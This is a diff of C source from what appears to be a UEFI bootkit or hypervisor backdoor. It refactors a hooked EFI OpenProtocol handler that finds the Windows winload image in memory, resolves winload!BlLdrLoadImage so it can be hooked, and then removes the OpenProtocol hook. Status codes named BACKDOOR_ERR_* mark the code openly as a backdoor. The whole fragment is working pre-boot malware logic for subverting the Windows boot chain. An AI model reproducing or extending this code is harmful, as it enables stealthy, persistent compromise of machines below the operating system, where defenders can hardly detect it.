@@ -412,27 +412,26 @@ EFI_STATUS EFIAPI new_OpenProtocol(
 {
     if (m_WinloadBase == NULL)
     {        
-        // chcek if OpenProtocol() was called from the winload image
-        if ((m_WinloadBase = FindCallerImage(ret_OpenProtocol, "BootLib.dll")) != NULL)
-        {
-            DbgMsg(__FILE__, __LINE__, "winload.dll is at "FPTR"\r\n", m_WinloadBase);
+        VOID *WinloadBase = NULL;
 
+        // chcek if OpenProtocol() was called from the winload image
+        if ((WinloadBase = FindCallerImage(ret_OpenProtocol, "BootLib.dll")) != NULL)
+        {            
             m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_FUNC;
 
             // get winload!BlLdrLoadImage() export address
-            if ((old_BlLdrLoadImage = (func_BlLdrLoadImage)LdrGetProcAddress(m_WinloadBase, "BlLdrLoadImage")) != NULL)
+            if ((old_BlLdrLoadImage = (func_BlLdrLoadImage)LdrGetProcAddress(WinloadBase, "BlLdrLoadImage")) != NULL)
             {
+                DbgMsg(__FILE__, __LINE__, "winload.dll is at "FPTR"\r\n", WinloadBase);
                 DbgMsg(__FILE__, __LINE__, "winload!BlLdrLoadImage() is at "FPTR"\r\n", old_BlLdrLoadImage);   
 
                 m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_HOOK;
-            }
-            else
-            {
-                DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!BlLdrLoadImage()\r\n");
-            }
 
-            // remove EFI_BOOT_SERVICES.OpenProtocol() hook
-            m_BS->OpenProtocol = old_OpenProtocol;  
+                // remove EFI_BOOT_SERVICES.OpenProtocol() hook
+                m_BS->OpenProtocol = old_OpenProtocol;  
+
+                m_WinloadBase = WinloadBase;
+            }
         }
 
         if (old_BlLdrLoadImage)
